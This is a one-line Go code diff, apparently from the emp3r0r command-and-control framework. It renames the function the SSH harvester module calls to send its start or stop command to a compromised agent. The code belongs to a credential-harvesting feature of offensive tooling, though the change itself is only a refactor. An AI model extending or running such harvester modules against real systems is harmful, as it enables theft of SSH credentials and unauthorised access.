@@ -33,7 +33,7 @@ func module_ssh_harvester() {
 			cmd = fmt.Sprintf("%s --stop", emp3r0r_def.C2CmdSSHHarvester)
 		}
 	}
-	err := agents.SendCmdToCurrentTarget(cmd, "")
+	err := agents.SendCmdToCurrentAgent(cmd, "")
 	if err != nil {
 		logging.Errorf("SendCmd: %v", err)
 		return
